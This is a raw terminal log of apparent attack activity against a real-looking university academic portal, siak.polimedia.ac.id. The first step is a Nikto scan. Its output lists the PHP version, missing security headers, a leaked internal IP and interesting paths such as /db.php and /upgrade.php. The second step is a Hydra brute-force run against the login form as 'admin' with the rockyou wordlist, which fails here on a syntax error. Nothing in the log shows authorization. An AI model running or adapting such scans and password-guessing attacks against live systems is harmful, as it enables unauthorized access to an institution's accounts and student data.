┌──(lilo㉿lilo)-[~]
└─$ nikto -h https://siak.polimedia.ac.id
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          139.59.219.33
+ Target Hostname:    siak.polimedia.ac.id
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=siak.polimedia.ac.id
                   Ciphers:  ECDHE-ECDSA-AES256-GCM-SHA384
                   Issuer:   /C=US/O=Let's Encrypt/CN=E8
+ Start Time:         2025-09-16 23:12:29 (GMT7)
---------------------------------------------------------------------------
+ Server: nginx
+ /: Cookie PHPSESSID created without the secure flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Retrieved x-powered-by header: PHP/7.2.34.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "10.130.223.0". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ /css/: This might be interesting.
+ /forum/: This might be interesting.
+ /tools/: This might be interesting.
+ /db.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /upgrade.php: upgrade.php was found.




┌──(lilo㉿lilo)-[/]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt https://www.siak.polimedia.ac.id/ http-form-post "/login.php:username^USER^&password^PASS^:F=incorrect"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 23:29:39
[ERROR] Invalid target definition!
[ERROR] Either you use "www.example.com module [optional-module-parameters]" *or* you use the "module://www.example.com/optional-module-parameters" syntax!
